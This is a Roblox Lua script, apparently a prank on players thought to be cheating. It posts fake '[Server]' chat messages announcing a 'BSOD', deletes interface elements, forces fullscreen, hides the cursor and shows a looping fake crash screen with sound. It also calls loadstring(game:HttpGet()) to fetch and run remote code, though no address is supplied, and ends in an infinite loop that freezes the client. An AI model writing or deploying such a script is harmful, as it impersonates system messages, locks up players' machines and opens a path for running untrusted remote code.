--Fixing oof
--local TextService = game:GetService("TextService")
--local filteredTextResult = TextService:FilterStringAsync(text, fromPlayerId)

wait(1)
local b = BrickColor.new("Bright yellow")
game.StarterGui:SetCore("ChatMakeSystemMessage", {
Text = "[Server]: Access Successfully to trolling a hacking user\n[Server]: Dont hack get gud at game\n[Server]: -- BaconGuy#1440";
Font = Arial;
Color = b.Color;
FontSize = Enum.FontSize.Size96;
})

wait(3)
local b = BrickColor.new("Bright blue")
game.StarterGui:SetCore("ChatMakeSystemMessage", {
Text = "[Server]: Ready for a bad time kid./n[Server]: Get trolled kid";
Font = Arial;
Color = b.Color;
FontSize = Enum.FontSize.Size96;
})

wait(4)
local b = BrickColor.new("Bright red")
game.StarterGui:SetCore("ChatMakeSystemMessage", {
Text = "[Server]: Sending BSOD to [Local.User]";
Font = Arial;
Color = b.Color;
FontSize = Enum.FontSize.Size96;
})

wait(7)
local coregui = game:service'CoreGui'

local sound = Instance.new('Sound', coregui)
sound.SoundId = 'rbxassetid://865599816'
sound.Volume = 3
sound.Looped = true

local gui = Instance.new('ScreenGui', coregui)
local image = Instance.new('ImageLabel', gui)
image.Position = UDim2.new(0, 0, -0.05, 0)
image.Size = UDim2.new(1, 0, 1.05, 0)
image.Image = "rbxassetid://9637192164"
image.Visible = false

task.wait(1)

for i,v in pairs(coregui:GetChildren()) do
    if v ~= gui and v ~= sound then
        v:Destroy()   
    end
end

if (not UserSettings().GameSettings:InFullScreen()) then
    game:service'GuiService':ToggleFullscreen()    
end

game:service'UserInputService'.MouseIconEnabled = false
sound:Play()
image.Visible = true

task.wait(1)
loadstring(game:HttpGet())

while true do end


